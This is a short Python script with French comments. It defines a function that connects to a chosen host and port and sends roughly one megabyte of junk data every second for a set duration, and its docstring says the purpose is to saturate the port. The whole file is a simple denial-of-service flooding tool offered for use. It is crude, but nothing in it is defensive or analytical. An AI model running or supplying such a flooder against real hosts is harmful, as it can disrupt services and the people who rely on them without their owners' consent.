import time
import socket # on importe la bibliothèque qui permet de créer des interfaces réseau virtuelles

def sat(duree, port, host):
    """Fonction pour saturer un port

    Args:
        duree (integer): Durée en secondes de l'exécution
        port (integer): port à saturer
        host (string): hôte à saturer
    """

    timer = time.time() + duree # durée de l'opération

    # Création d'un socket (interface virtuelle sur laquelle on va envoyer des données)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    try:
        s.connect((host, port)) # connexion au socket
        
        while time.time() < timer: # pour la durée spécifié
            s.send(b'0' * 1024 * 1024) # on envoie environ 1MB de données
            time.sleep(1)
        s.close()
    except OSError: # si on n'a pas réussi à se connecter, on ne fait rien
        return False